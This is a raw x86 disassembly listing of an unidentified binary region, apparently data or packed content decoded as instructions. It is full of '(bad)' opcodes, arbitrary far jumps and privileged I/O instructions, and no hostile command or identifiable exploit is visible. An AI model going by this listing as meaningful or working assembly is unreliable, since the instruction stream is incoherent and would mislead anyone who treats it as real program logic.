  413f43:	push   esi
  413f44:	inc    edi
  413f45:	ins    BYTE PTR es:[edi],dx
  413f46:	add    BYTE PTR [eax],al
  413f48:	jbe    0x413f8e
  413f4a:	push   esi
  413f4b:	push   edi
  413f4c:	dec    edx
  413f4d:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413f54:	add    BYTE PTR [eax],al
  413f56:	in     al,0xf5
  413f58:	jnp    0x413fa8
  413f5a:	jnp    0x413f2a
  413f5c:	cmc    
  413f5d:	call   FWORD PTR [ebx+0x61]
  413f60:	and    bh,dl
  413f62:	jge    0x413f24
  413f64:	jp     0x413f11
  413f66:	xlat   BYTE PTR ds:[bx]
  413f68:	add    BYTE PTR [eax],al
  413f6a:	add    BYTE PTR [ecx],al
  413f6c:	add    BYTE PTR [eax],al
  413f6e:	aaa    
  413f6f:	jl     0x413f31
  413f71:	mov    edx,0xe0f5b564
  413f76:	in     al,0xbb
  413f78:	push   cs
  413f79:	adc    al,0xa3
  413f7b:	add    BYTE PTR [edi+0x51],dh
  413f7e:	pop    esi
  413f7f:	imul   edx,DWORD PTR [edi+0x50],0x189fb57d
  413f86:	xchg   edi,eax
  413f87:	aaa    
  413f88:	leave  
  413f89:	or     esp,DWORD PTR [eax-0xa6395db]
  413f8f:	mov    BYTE PTR [ecx+0x1683f5e6],al
  413f95:	xchg   esi,eax
  413f96:	fisttp WORD PTR [eax+0x1941bcc5]
  413f9c:	inc    edx
  413f9d:	int3   
  413f9e:	xchg   edi,eax
  413f9f:	pop    ecx
  413fa0:	pop    ebp
  413fa1:	arpl   WORD PTR [ebx],sp
  413fa3:	in     eax,0x82
  413fa5:	shl    BYTE PTR [eax+0x4596f01c],0xba
  413fac:	call   0x8748:0x875d4192
  413fb3:	inc    edi
  413fb4:	sahf   
  413fb5:	xlat   BYTE PTR ds:[ebx]
  413fb6:	fdiv   QWORD PTR [ebx+eax*1]
  413fb9:	fidivr DWORD PTR ds:0x8aae1778
  413fbf:	test   al,0x2c
  413fc1:	scas   al,BYTE PTR es:[edi]
  413fc2:	ror    BYTE PTR [edx+0x61aae108],1
  413fc8:	xor    eax,0xf0df4987
  413fcd:	sub    DWORD PTR ds:0xa835,ecx
  413fd2:	imul   esp,DWORD PTR [esi-0x387aad32],0x435f916c
  413fdc:	jmp    0x56bc:0x750456e1
  413fe3:	push   es
  413fe4:	adc    DWORD PTR [ecx+0x73],esp
  413fe7:	xchg   esp,eax
  413fe8:	inc    eax
  413fe9:	addr16 mov esp,edi
  413fec:	mov    bl,0x3c
  413fee:	test   al,0x4
  413ff0:	inc    eax
  413ff1:	lds    edi,FWORD PTR [ecx-0x77]
  413ff4:	sub    WORD PTR [eax*1+0x31c04ac0],bx
  413ffc:	push   ss
  413ffd:	or     DWORD PTR [edx],esi
  413fff:	xchg   DWORD PTR [eax],edx
  414001:	clc    
  414002:	test   eax,0xff4bdedc
  414007:	mov    al,ds:0xdb67c93c
  41400c:	adc    eax,0x3801ae0
  414011:	imul   edx,DWORD PTR [ecx-0xc],0xfaef57a0
  414018:	or     BYTE PTR [eax-0x25555ba2],dh
  41401e:	clc    
  41401f:	int    0x1d
  414021:	and    esp,ebp
  414023:	pop    edx
  414024:	xchg   ebp,eax
  414025:	fcom   DWORD PTR [eax+0x38086b73]
  41402b:	mov    esp,esi
  41402d:	(bad)  
  41402e:	mov    bl,0x1f
  414030:	mov    ds:0xbfaf3e0f,al
  414035:	mov    eax,ds:0x42df7902
  41403a:	mov    esi,0x838f8918
  41403f:	pop    eax
  414040:	stos   DWORD PTR es:[edi],eax
  414041:	adc    dl,BYTE PTR [edx-0x45]
  414044:	dec    ebx
  414045:	jg     0x41406d
  414047:	pop    esp
  414048:	(bad)
  41404b:	dec    esp
  41404c:	fwait
  41404d:	sti    
  41404e:	inc    esp
  41404f:	repz inc edx
  414051:	repz xor eax,0xa95a6596
  414057:	pop    esp
  414058:	test   BYTE PTR [ebx],0x3b
  41405b:	or     DWORD PTR [ebx-0x59],edx
  41405e:	jle    0x4140a3
  414060:	or     esp,edi
  414062:	and    BYTE PTR [ebx+0x552ead3b],ah
  414068:	dec    ecx
  414069:	mov    al,0x8c
  41406b:	or     bl,BYTE PTR [ebx]
  41406d:	pop    esi
	...
  4140d6:	pop    edx
  4140d7:	ficom  DWORD PTR [esi+0x60]
  4140da:	(bad)  
  4140db:	in     al,dx
  4140dc:	jle    0x4140d8
  4140de:	call   0x4da3:0x29d52e96
  4140e5:	mov    cl,0x67
  4140e7:	fadd   DWORD PTR [eax]
  4140e9:	add    BYTE PTR [eax],al
  4140eb:	add    DWORD PTR [eax],eax
  4140ed:	add    BYTE PTR [edi-0x59fc0ce4],ch
  4140f3:	jne    0x4140bb
  4140f5:	adc    esi,ecx
  4140f7:	loopne 0x4140d5
  4140f9:	test   eax,0xaa94f1f2
  4140fe:	test   BYTE PTR [ebp-0x100d1349],bh
  414104:	fidiv  DWORD PTR [esp+ebp*8-0x74]
  414108:	add    eax,0xb262ba10
  41410d:	call   0x7d98:0xa93c973f
  414114:	clc    
  414115:	in     al,0x6e
  414117:	mov    ah,0x7d
  414119:	mov    esp,0x7ecd69b6
  41411e:	out    0x57,eax
  414120:	jmp    0x4140ba
  414122:	sub    ch,dl
  414124:	loop   0x4140f1
  414126:	jg     0x41411c
  414128:	mov    al,ds:0x2c7064de
  41412d:	mov    dl,0xe4
  41412f:	and    eax,DWORD PTR [edx-0x30]
  414132:	ins    DWORD PTR es:[edi],dx
  414133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414134:	mov    DWORD PTR [ebp-0x4791f5a8],ebp
  41413a:	leave  
  41413b:	data16 mov al,0xd5
  41413e:	dec    edx
  41413f:	pop    esp
  414140:	xchg   esp,eax
  414141:	data16 ja 0x4140e6
  414144:	pop    ss
  414145:	xlat   BYTE PTR ds:[ebx]
  414146:	imul   ebx,eax,0xf7eb58f2
  41414c:	test   eax,0x8331eef5
  414151:	out    0xe9,eax
  414153:	jecxz  0x4141c7
  414155:	adc    BYTE PTR [ebp-0xdb421b0],al
  41415b:	push   edi
  41415c:	ins    BYTE PTR es:[edi],dx
  41415d:	cld    
  41415e:	pop    eax
  41415f:	iret   
  414160:	mov    eax,0x7cb9fda3
  414165:	ds jnp 0x414177
  414168:	ror    esp,0x95
  41416b:	jno    0x41418b
  41416d:	sub    esp,0x5a7f8763
  414173:	outs   dx,DWORD PTR ds:[esi]
  414174:	xchg   edi,eax
  414175:	jbe    0x414145
  414177:	aad    0x6a
  414179:	jle    0x41416b
  41417b:	je     0x41411c
  41417d:	shr    al,0xfb
  414180:	xchg   esi,eax
  414181:	(bad)
  414184:	ins    DWORD PTR es:[edi],dx
  414185:	dec    edx
  414186:	sub    al,0x93
  414188:	scas   eax,DWORD PTR es:[edi]
  414189:	mov    bh,0x39
  41418b:	je     0x414152
  41418d:	jnp    0x4141aa
  41418f:	mov    ecx,0xc6dfde32
  414194:	fstp   TBYTE PTR [edi]
  414196:	or     eax,0x644a7c1f
  41419b:	daa    
  41419c:	test   ch,dl
  41419e:	cmp    BYTE PTR [edx+0x38],al
  4141a1:	sbb    dl,bh
  4141a3:	jmp    0x4fcd:0x3b3f3fdd
  4141aa:	add    al,0x51
  4141ac:	fld1   
  4141ae:	repz mul al
  4141b1:	adc    cl,BYTE PTR ds:0x5becbd5f
  4141b7:	push   ss
  4141b8:	addr16 addr16 aam 0x4d
  4141bc:	xlat   BYTE PTR ds:[ebx]
  4141bd:	adc    BYTE PTR [edi+0xeeef065],bl
  4141c3:	pop    es
  4141c4:	lds    ecx,FWORD PTR [ecx]
  4141c6:	ror    DWORD PTR [edx+esi*4+0x73a805f0],0xcc
  4141ce:	adc    eax,0xee6c33c1
  4141d3:	icebp  
  4141d4:	lods   al,BYTE PTR ds:[esi]
  4141d5:	or     edx,edi
  4141d7:	fwait
  4141d8:	jno    0x414234
  4141da:	xchg   ebp,eax
  4141db:	dec    edi
  4141dc:	int3   
  4141dd:	or     al,ch
  4141df:	cmc    
  4141e0:	inc    ebp
  4141e1:	icebp  
  4141e2:	xchg   ebx,eax
  4141e3:	sub    BYTE PTR [esi+0x2e],al
  4141e6:	dec    edx
  4141e7:	push   es
  4141e8:	jl     0x41420b
  4141ea:	in     eax,dx
  4141eb:	and    eax,0x5aba
	...
  414254:	add    BYTE PTR [eax],al
  414256:	add    dl,BYTE PTR [edx]
  414258:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41425e:	mov    DWORD PTR [ecx+0x37],edx
  414261:	push   edi
  414262:	imul   edi,edi,0xffffffb5
  414265:	mov    ecx,0xd967
  41426a:	add    BYTE PTR [ecx],al
  41426c:	add    BYTE PTR [eax],al
  41426e:	es jecxz 0x414217
  414271:	dec    ebp
  414272:	xchg   esp,eax
  414273:	add    al,0x9a
  414275:	dec    edx
  414276:	sbb    al,0x5
  414278:	inc    esp
  414279:	out    dx,al
  41427a:	stos   BYTE PTR es:[edi],al
  41427b:	mov    ah,0x12
  41427d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41427e:	xchg   ebp,eax
  41427f:	jae    0x414289
  414281:	xor    DWORD PTR [edi],esp
  414283:	std    
  414284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414285:	and    eax,0x4b213037
  41428a:	in     eax,dx
  41428b:	xchg   edi,eax
  41428c:	and    esi,ecx
  41428e:	(bad)  
  414290:	inc    esp
  414291:	int3   
  414292:	push   edi
  414293:	dec    eax
  414294:	and    DWORD PTR [ebx*1-0x39e827b5],ebx
  41429b:	pop    ecx
  41429c:	mov    edi,0x866eeaea
  4142a1:	(bad)
  4142a4:	mul    BYTE PTR [edx-0x2e]
  4142a7:	xor    ah,ch
  4142a9:	push   eax
  4142aa:	cmp    ebx,esp
  4142ac:	push   eax
  4142ad:	jmp    0x414247
  4142af:	xchg   edi,eax
  4142b0:	lahf   
  4142b1:	xchg   ebx,eax
  4142b2:	cs push esi
  4142b4:	mov    dl,0x75
  4142b6:	sub    DWORD PTR [ecx+0x1e],esp
  4142b9:	fiadd  DWORD PTR [edi+eax*4+0x45118a48]
  4142c0:	jnp    0x41425d
  4142c2:	mov    bl,0x3a
  4142c4:	push   edx
  4142c5:	ror    DWORD PTR [eax+ebp*8+0x17cba52d],1
  4142cc:	out    0x41,eax
  4142ce:	push   ss
  4142cf:	xor    dh,BYTE PTR [eax-0x2b6d3e82]
  4142d5:	in     eax,0x32
  4142d7:	and    DWORD PTR [ecx-0x3105c0],edx
  4142dd:	ret    0xc9d8
  4142e0:	test   al,0x9e
  4142e2:	enter  0x580f,0x1
  4142e6:	push   es
  4142e7:	pop    esp
  4142e8:	in     eax,0x3d
  4142ea:	cwde   
  4142eb:	jge    0x414288
  4142ed:	add    edi,DWORD PTR [ebx]
  4142ef:	xchg   edx,eax
  4142f0:	add    cx,WORD PTR [edx+ebp*8]
  4142f4:	cli    
  4142f5:	inc    esp
  4142f6:	pop    esp
  4142f7:	mov    eax,DWORD PTR [ecx-0x736eeda3]
  4142fd:	mov    esi,0xcf504dfe
  414302:	das    
  414303:	cmp    eax,0x860ac5f9
  414308:	or     DWORD PTR ds:0x5bafc68a,edi
  41430e:	add    dl,BYTE PTR [ecx+0x48964bd8]
  414314:	shr    dh,1
  414316:	jne    0x414335
  414318:	adc    esi,esp
  41431a:	xchg   edx,eax
  41431b:	pop    eax
  41431c:	retf   
  41431d:	clc    
  41431e:	stos   DWORD PTR es:[edi],eax
  41431f:	aad    0x84
  414321:	mul    DWORD PTR [esi+0x72]
  414324:	jmp    DWORD PTR [ebx-0x758007b8]
  41432a:	ret    0xebc1
  41432d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41432e:	sub    al,0xe1
  414330:	(bad)  
  414331:	sbb    ecx,DWORD PTR [ebx+ecx*2-0x1f]
  414335:	repnz dec ebx
  414337:	jmp    0x41433e
  414339:	jno    0x414308
  41433b:	std    
  41433c:	push   eax
  41433d:	xor    ah,BYTE PTR [edi-0x165b61dd]
  414343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414344:	mov    bl,0x48
  414346:	fwait
  414347:	lock rol bl,1
  41434a:	mov    DWORD PTR [edi+0x62],esi
  41434d:	jae    0x4143a2
  41434f:	mov    ecx,0x7384874d
  414354:	popa   
  414355:	sbb    dl,BYTE PTR [eax-0x70]
  414358:	std    
  414359:	das    
  41435a:	xlat   BYTE PTR ds:[ebx]
  41435b:	push   ds
  41435c:	fld    TBYTE PTR ds:0x868873d2
  414362:	scas   al,BYTE PTR es:[edi]
  414363:	xchg   esi,eax
  414364:	into   
  414365:	dec    ebp
  414366:	popf   
  414367:	jae    0x414386
  414369:	fcomp  QWORD PTR [ebp+0x8b92dc]
	...
  4143d3:	add    BYTE PTR [eax],al
  4143d5:	add    BYTE PTR [ecx],al
  4143d7:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  4143de:	rol    DWORD PTR [ebp+0x5e],0xa1
  4143e2:	loope  0x414401
  4143e4:	(bad)  
  4143e5:	(bad)  
  4143e6:	fiadd  DWORD PTR [bx+si]
  4143e9:	add    BYTE PTR [eax],al
  4143eb:	add    DWORD PTR [eax],eax
  4143ed:	add    BYTE PTR [eax+esi*1],dh
  4143f0:	add    al,0x7
  4143f2:	ss dec esi
  4143f4:	ja     0x4143ff
  4143f6:	arpl   WORD PTR [ebx+0x2575a986],bx
  4143fc:	enter  0x1c99,0x65
  414400:	mov    dl,0x33
  414402:	adc    ch,0xf4
  414405:	pop    eax
  414406:	retf   
  414407:	and    edx,ecx
  414409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41440a:	ss das 
  41440c:	push   esp
  41440d:	out    0x27,al
  41440f:	xor    eax,0xe1196382
  414415:	clc    
  414416:	or     DWORD PTR [ebp+0x64],esp
  414419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41441a:	xor    al,0x92
  41441c:	loopne 0x414478
  41441e:	jno    0x41449d
  414420:	or     DWORD PTR [edi+edi*1+0x28],edx
  414424:	loopne 0x4143c2
  414426:	fidiv  WORD PTR [ecx+0x64]
  414429:	ret    0xdb3c
  41442c:	sti    
  41442d:	xor    al,0x4d
  41442f:	cwde   
  414430:	cmc    
  414431:	adc    DWORD PTR [edx],edi
  414433:	pop    ss
  414434:	ret    
  414435:	add    esi,0xedd71a4c
  41443b:	push   esp
  41443c:	sahf   
  41443d:	in     eax,0x48
  41443f:	sbb    DWORD PTR [esi-0x2d],ebx
  414442:	sub    cl,al
  414444:	xchg   edi,eax
  414445:	sbb    BYTE PTR [ebp-0x64cf5b20],al
  41444b:	push   eax
  41444c:	xchg   ebx,eax
  41444d:	in     al,0x41
  41444f:	cmp    BYTE PTR [eax-0x2d],ah
  414452:	fsubr  DWORD PTR [eax]
  414454:	inc    edi
  414455:	fmul   QWORD PTR [ecx-0x32f28588]
  41445b:	mov    esp,0x7d8031e2
  414460:	push   esi
  414461:	dec    ecx
  414462:	dec    ebx
  414463:	add    eax,0x9d22d3d5
  414468:	imul   edi,DWORD PTR [ebx-0x76],0x5c698526
  41446f:	loope  0x41440c
  414471:	repz not BYTE PTR [ecx+edx*4]
  414475:	mov    dl,0xb3
  414477:	cld    
  414478:	dec    edx
  414479:	ja     0x414431
  41447b:	push   ecx
  41447c:	addr16 ret 0x8c05
  414480:	inc    ebx
  414481:	mov    BYTE PTR [ebx+0x34],ch
  414484:	sub    cl,BYTE PTR [edx+0x3f936bfa]
  41448a:	xor    esp,esi
  41448c:	pop    edx
  41448d:	js     0x4144cf
  41448f:	addr16 hlt 
  414491:	jnp    0x41442a
  414493:	imul   edx,DWORD PTR ds:0xbdd86e27,0x3e
  41449a:	adc    ch,BYTE PTR [eax]
  41449c:	inc    eax
  41449d:	jno    0x4144a0
  41449f:	arpl   WORD PTR [edi-0x60b0be9c],di
  4144a5:	pushf  
  4144a6:	xor    cl,BYTE PTR [ecx+ecx*2]
  4144a9:	mov    eax,ds:0x7a6e5f42
  4144ae:	jmp    0x414430
  4144b0:	xor    eax,0x8b7e1906
  4144b5:	loop   0x41447a
  4144b7:	sbb    DWORD PTR [ebx+0x3fd4eff3],esi
  4144bd:	xor    BYTE PTR [ecx-0x63],cl
  4144c0:	inc    esi
  4144c1:	jg     0x4144e2
  4144c3:	aad    0x7d
  4144c5:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144c7:	fisttp WORD PTR [ebx]
  4144c9:	inc    eax
  4144ca:	push   0x66
  4144cc:	pop    ds
  4144cd:	cmp    eax,esp
  4144cf:	sub    cl,BYTE PTR [ebx-0x4f206777]
  4144d5:	mov    ecx,0xaac25677
  4144da:	ins    BYTE PTR es:[edi],dx
  4144db:	push   esi
  4144dc:	push   DWORD PTR [edx]
  4144de:	push   esi
  4144df:	aas    
  4144e0:	sbb    al,0xc4
  4144e2:	xlat   BYTE PTR ds:[ebx]
  4144e3:	call   0x9657:0xd749d4da
  4144ea:	fadd   st(2),st
  4144ec:	fisub  WORD PTR [esi+0x0]
	...
  414553:	add    BYTE PTR [eax],al
  414555:	add    BYTE PTR [ebx+0x73],bl
  414558:	inc    edx
  414559:	or     eax,0x775f3d6a
  41455e:	pop    ds
  41455f:	dec    edi
  414560:	or     cl,BYTE PTR [esi-0x36]
  414563:	mov    dl,0xf1
  414565:	mov    esi,0xdb67
  41456a:	add    BYTE PTR [ecx],al
  41456c:	add    BYTE PTR [eax],al
  41456e:	dec    ecx
  41456f:	int3   
  414570:	sahf   
  414571:	jno    0x414593
  414573:	xchg   edi,eax
  414574:	inc    ecx
  414575:	mov    dh,0x6
  414577:	pop    ds
  414578:	cli    
  414579:	mov    eax,0x555c9f07
  41457e:	pushf  
  41457f:	iret   
  414580:	call   DWORD PTR [ecx-0x93b7883]
  414586:	ret    
  414587:	add    DWORD PTR [edi],esi
  414589:	mov    esp,0xea8fdf89
  41458e:	cs adc eax,0x5345aedb
  414594:	sbb    ecx,eax
  414596:	mov    ds:0x1ca6d552,al
  41459b:	push   edx
  41459c:	xchg   esi,eax
  41459d:	iret   
  41459e:	lods   eax,DWORD PTR ds:[esi]
  41459f:	fadd   st(0),st
  4145a1:	and    eax,DWORD PTR [ebp-0x298728d6]
  4145a7:	mov    DWORD PTR ds:0x1be188be,ecx
  4145ad:	mov    edi,0x59b6f59d
  4145b2:	sahf   
  4145b3:	adc    esp,DWORD PTR [ebx-0x5c17714]
  4145b9:	ret    0x4305
  4145bc:	mov    edx,0xc3aa2759
  4145c1:	push   cs
  4145c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145c3:	jns    0x4145d6
  4145c5:	push   0xcec65ff4
  4145ca:	fcom   QWORD PTR [esp+eax*1-0x43]
  4145ce:	ret    
  4145cf:	lods   eax,DWORD PTR ds:[esi]
  4145d1:	fstp   QWORD PTR [edi-0x56]
  4145d4:	mov    bh,0xa3
  4145d6:	and    eax,DWORD PTR ds:0x523cd518
  4145dc:	mov    DWORD PTR [edi+0x2a1ab95b],ecx
  4145e2:	sub    eax,0x6d90daf7
  4145e7:	bound  ebp,QWORD PTR [edi+0x6c66b7e4]
  4145ed:	cmp    BYTE PTR [ebx],0x19
  4145f0:	adc    DWORD PTR [edi+0x19],ebp
  4145f3:	ins    DWORD PTR es:[edi],dx
  4145f4:	repnz stc 
  4145f6:	pop    DWORD PTR [ecx-0x6a6a8b58]
  4145fc:	stos   DWORD PTR es:[edi],eax
  4145fd:	into   
  4145fe:	iret   
  4145ff:	cdq    
  414600:	jae    0x41458d
  414602:	test   al,cl
  414604:	sbb    ebp,edx
  414606:	xchg   ebp,eax
  414607:	aad    0x4c
  414609:	gs in  al,0xfc
  41460c:	jbe    0x414653
  41460e:	cs in  al,dx
  414610:	pmulhuw mm6,QWORD PTR [esi]
  414613:	in     eax,0xfa
  414615:	stos   BYTE PTR es:[edi],al
  414616:	xor    dl,dh
  414618:	mov    esp,0x9770f1bd
  41461d:	icebp  
  41461e:	xchg   edi,eax
  41461f:	call   0x1878:0x281ce48b
  414626:	inc    ecx
  414627:	cmp    esi,esp
  414629:	sbb    BYTE PTR [ecx],al
  41462b:	ror    DWORD PTR [ebx-0x5aba89dc],cl
  414631:	bound  ebx,QWORD PTR [edi]
  414633:	mov    edx,0x4f0be963
  414638:	rcl    BYTE PTR [esi+0x18],1
  41463b:	dec    esp
  41463c:	mov    dl,0x9f
  41463e:	jmp    0xd501:0xd3262679
  414645:	jmp    0x414695
  414647:	lahf   
  414648:	ins    DWORD PTR es:[edi],dx
  414649:	test   al,0x3c
  41464b:	ret    0x5494
  41464e:	xor    DWORD PTR [esi-0x56c518b2],edx
  414654:	fcomp  QWORD PTR [ebx-0x7a]
  414657:	pusha  
  414658:	push   esi
  414659:	jge    0x4146b1
  41465b:	inc    esp
  41465c:	mov    ?,WORD PTR [esi-0x61b8f907]
  414662:	mov    al,0x46
  414664:	inc    ebx
  414665:	dec    esi
  414666:	xchg   eax,ecx
  414668:	aaa    
  414669:	fdivr  QWORD PTR [eax-0x4]
  41466c:	nop
  41466d:	pop    ss
	...
  4146d6:	jg     0x414736
  4146d8:	cmc    
  4146d9:	ins    DWORD PTR es:[edi],dx
  4146da:	cmc    
  4146db:	out    dx,eax
  4146dc:	call   FWORD PTR [esi+0x17]
  4146df:	enter  0xab7a,0xa1
  4146e3:	out    0x99,eax
  4146e5:	in     eax,0x67
  4146e7:	fadd   QWORD PTR [eax]
  4146e9:	add    BYTE PTR [eax],al
  4146eb:	add    DWORD PTR [eax],eax
  4146ed:	add    BYTE PTR [edi-0x76d5a721],al
  4146f3:	into   
  4146f4:	aam    0x54
  4146f6:	rcl    dh,0xa7
  4146f9:	dec    esi
  4146fa:	rcr    DWORD PTR [edi],1
  4146fc:	(bad)  
  4146fd:	jmp    0x414741
  4146ff:	clc    
  414700:	hlt    
  414701:	stos   DWORD PTR es:[edi],eax
  414702:	gs in  eax,0x87
  414705:	fistp  DWORD PTR [ecx]
  414707:	arpl   WORD PTR [eax+0x6718b383],si
  41470d:	sbb    edx,DWORD PTR [edi]
  41470f:	cmp    al,0x21
  414711:	rcr    DWORD PTR [edi-0x200fc446],cl
  414717:	push   cs
  414718:	lahf   
  414719:	add    al,0x6c
  41471b:	call   0x3464:0x1866fb24
  414722:	jge    0x4146ae
  414724:	dec    esp
  414725:	call   0x51ad:0x1f9fa6ef
  41472c:	cmp    BYTE PTR [edx+0x28],dh
  41472f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414730:	arpl   sp,sp
  414732:	sub    DWORD PTR [ebx+0x1a],edi
  414735:	cmc    
  414736:	jp     0x414766
  414738:	test   al,0x66
  41473a:	in     al,0x3e
  41473c:	inc    edi
  41473d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41473e:	scas   al,BYTE PTR es:[edi]
  41473f:	(bad)  
  414741:	mov    dh,0x9a
  414743:	je     0x41474e
  414745:	sbb    BYTE PTR [ecx],cl
  414747:	cmp    al,0xaa
  414749:	(bad)  
  41474a:	fisubr WORD PTR [eax-0x6dc79721]
  414750:	not    DWORD PTR [ecx+0x323214d6]
  414756:	push   ecx
  414757:	fnsave [edx+0x5947085b]
  41475d:	xlat   BYTE PTR ds:[ebx]
  41475e:	repz test al,0x8b
  414761:	inc    edi
  414762:	mov    dl,0x5c
  414764:	dec    eax
  414765:	stos   DWORD PTR es:[edi],eax
  414766:	cmp    eax,0x13afd0b9
  41476b:	mov    ds:0x6e2a713,eax
  414770:	inc    ecx
  414771:	xor    eax,0xb062fb0a
  414776:	stc    
  414777:	(bad)  
  414778:	fmul   st,st(5)
  41477a:	xor    BYTE PTR [esi+0x20e6064d],al
  414780:	stos   DWORD PTR es:[edi],eax
  414781:	dec    eax
  414782:	fnstcw WORD PTR [ecx-0x54]
  414785:	mov    ds:0xa4e0f22c,al
  41478a:	jmp    0x41479f
  41478c:	lods   eax,DWORD PTR ds:[esi]
  41478d:	and    esi,0x64
  414790:	mov    ebx,0xa274d8ee
  414795:	jmp    0x4147f5
  414797:	push   ebp
  414798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414799:	out    dx,eax
  41479a:	ret    
  41479b:	inc    edi
  41479c:	call   0xdaaea09b
  4147a1:	enter  0x5742,0x62
  4147a5:	dec    bl
  4147a7:	xor    DWORD PTR ds:[ebx-0x4829549],edx
  4147ae:	adc    al,0x18
  4147b0:	adc    al,0xed
  4147b2:	je     0x41480d
  4147b4:	push   ebp
  4147b5:	call   0x43217fe6
  4147ba:	fdivr  st(7),st
  4147bc:	jmp    0xb993:0x16d42c02
  4147c3:	pop    ss
  4147c4:	xor    BYTE PTR [ebx],0xf0
  4147c7:	pop    esp
  4147c8:	add    DWORD PTR fs:[ebx-0x44],ebx
  4147cc:	popa   
  4147cd:	ds iret 
  4147cf:	or     ebp,DWORD PTR [ecx]
  4147d1:	dec    esp
  4147d2:	mov    ebx,0x9321416c
  4147d7:	xchg   edx,eax
  4147d8:	sub    BYTE PTR [ebp-0x72ae76e],ch
  4147de:	ret    
  4147df:	je     0x414853
  4147e1:	jnp    0x414778
  4147e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147e4:	popa   
  4147e5:	jecxz  0x414818
  4147e7:	mov    edi,0xf8fa8815
  4147ec:	pusha  
  4147ed:	inc    ebx
	...
  414856:	jle    0x414887
  414858:	add    DWORD PTR [ebp+0x51],ebp
  41485b:	outs   dx,DWORD PTR ds:[esi]
  41485c:	jle    0x41489d
  41485e:	aas    
  41485f:	mov    BYTE PTR [esi],cl
  414861:	cmp    eax,0x3ef0bbb9
  414866:	fld    QWORD PTR [bx+si]
  414869:	add    BYTE PTR [eax],al
  41486b:	add    DWORD PTR [eax],eax
  41486d:	add    BYTE PTR [eax+0x27],bh
  414870:	test   bl,dl
  414872:	or     ah,BYTE PTR [ecx]
  414874:	add    BYTE PTR [esi],0xc1
  414877:	adc    DWORD PTR [edi+0x63],esp
  41487a:	retf   
  41487b:	xchg   edx,eax
  41487c:	arpl   WORD PTR ds:0x8a770561,cx
  414882:	push   esp
  414883:	jle    0x414890
  414885:	add    eax,0x5d82028f
  41488a:	out    0xea,al
  41488c:	mov    eax,0x885f659
  414891:	xchg   esp,eax
  414892:	mov    ch,bh
  414894:	inc    eax
  414895:	jmp    0x41488f
  414897:	push   ss
  414898:	jg     0x41489b
  41489a:	adc    DWORD PTR [esi],ecx
  41489c:	adc    al,0xf0
  41489e:	jae    0x41487f
  4148a0:	cmp    edx,DWORD PTR [ecx+eax*8+0x4ab71736]
  4148a7:	xchg   esp,eax
  4148a8:	cmp    bl,bh
  4148aa:	movhps QWORD PTR [eax],xmm4
  4148ad:	loop   0x414928
  4148af:	inc    edi
  4148b0:	lock adc eax,0xf9912f00
  4148b6:	jge    0x414840
  4148b8:	sbb    DWORD PTR [edx+eiz*4-0x7c5ae4eb],0xb1a2b535
  4148c3:	sbb    DWORD PTR [ebx-0x73],edx
  4148c6:	aas    
  4148c7:	and    edx,DWORD PTR [esi+0x45b37884]
  4148cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148ce:	repnz into 
  4148d0:	mov    ebx,0xbd155721
  4148d5:	xor    eax,0xded9f821
  4148da:	loope  0x414900
  4148dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148dd:	gs out 0x74,al
  4148e0:	or     ch,BYTE PTR [eax-0x54]
  4148e3:	jle    0x414942
  4148e5:	cmp    cl,ah
  4148e7:	scas   eax,DWORD PTR es:[edi]
  4148e8:	out    0x2d,al
  4148ea:	add    cl,BYTE PTR [edi]
  4148ec:	xchg   DWORD PTR [esi],eax
  4148ee:	jb     0x414957
  4148f0:	push   ds
  4148f1:	cmp    BYTE PTR [ecx-0x5],0x4b
  4148f5:	ins    DWORD PTR es:[edi],dx
  4148f6:	fnstcw WORD PTR [ecx+0x69]
  4148f9:	out    dx,eax
  4148fa:	adc    al,0x1b
  4148fc:	fwait
  4148fd:	sti    
  4148fe:	int    0xcb
  414900:	popf   
  414901:	cmp    al,BYTE PTR [ecx]
  414903:	inc    ecx
  414904:	pushf  
  414905:	fadd   DWORD PTR [edi-0x3f]
  414908:	mov    al,ds:0x2df3146d
  41490d:	inc    eax
  41490e:	inc    eax
  41490f:	lahf   
  414910:	mov    cl,0x91
  414912:	clc    
  414913:	xchg   ecx,eax
  414914:	es jecxz 0x4148ca
  414917:	sbb    DWORD PTR [edx],0xc074daa5
  41491d:	rol    ah,1
  41491f:	xor    DWORD PTR [esi],eax
  414921:	rcr    bl,1
  414923:	sub    BYTE PTR [eax+0x5668ba6f],ah
  414929:	repnz (bad) 
  41492b:	cmp    edi,DWORD PTR [esi]
  41492d:	mov    al,BYTE PTR [edi]
  41492f:	mov    esp,0xc4000cc5
  414934:	sub    eax,0xb5c1a230
  414939:	adc    DWORD PTR [ebx+0x34b4f9ee],esp
  41493f:	mov    edi,0x8d8008cd
  414944:	xor    BYTE PTR [ebp+0x62],dh
  414947:	mov    ecx,0x5fa4b317
  41494c:	dec    ebx
  41494d:	inc    esp
  41494e:	outs   dx,DWORD PTR ds:[esi]
  41494f:	data16 fsub QWORD PTR [ebx+0x28]
  414953:	repnz int3 
  414955:	call   0xcaaf:0x31d6722d
  41495c:	jmp    FWORD PTR [edi+edx*4]
  41495f:	out    0x30,al
  414961:	jg     0x41493a
  414963:	addr16 dec edi
  414965:	pushf  
  414966:	xlat   BYTE PTR ds:[ebx]
  414967:	sub    BYTE PTR [eax],0xfe
  41496a:	dec    esp
  41496b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41496c:	xchg   ebx,eax
  41496d:	mov    ecx,0x0
	...
  4149d6:	or     edi,DWORD PTR [esi-0x2e]
